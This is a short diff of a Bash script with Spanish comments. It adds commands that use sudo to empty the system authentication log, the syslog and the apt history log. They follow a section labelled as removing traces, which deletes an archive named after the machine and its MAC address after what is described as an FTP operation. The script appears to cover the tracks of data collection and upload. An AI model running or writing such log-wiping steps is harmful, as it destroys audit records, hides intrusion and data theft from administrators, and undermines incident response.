@@ -118,3 +118,7 @@ echo "Operación FTP completada."
 # Eliminación de huellas 
 rm -rf "$output_dir"
 rm -rf "${nombre_maquina}-${direccion_mac}-${fecha}.tar.gz"
+
+sudo tee </dev/null /var/log/auth.log 
+sudo tee </dev/null /var/log/syslog 
+sudo tee </dev/null /var/log/apt/history.log 
